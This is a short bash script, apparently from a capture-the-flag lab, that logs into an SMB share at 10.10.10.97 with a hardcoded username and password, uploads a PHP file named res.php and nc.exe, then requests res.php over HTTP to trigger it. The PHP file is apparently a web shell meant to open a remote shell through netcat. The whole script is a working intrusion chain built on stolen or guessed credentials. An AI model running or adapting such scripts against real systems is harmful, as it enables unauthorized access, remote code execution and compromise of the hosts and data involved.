#!/bin/bash

echo "smb put res.php and nc.exe"
smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&'  //10.10.10.97/new-site -c 'put res.php' 
smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&'  //10.10.10.97/new-site -c 'put nc.exe' 

echo "connect 10.10.10.97"
curl http://10.10.10.97:8808/res.php
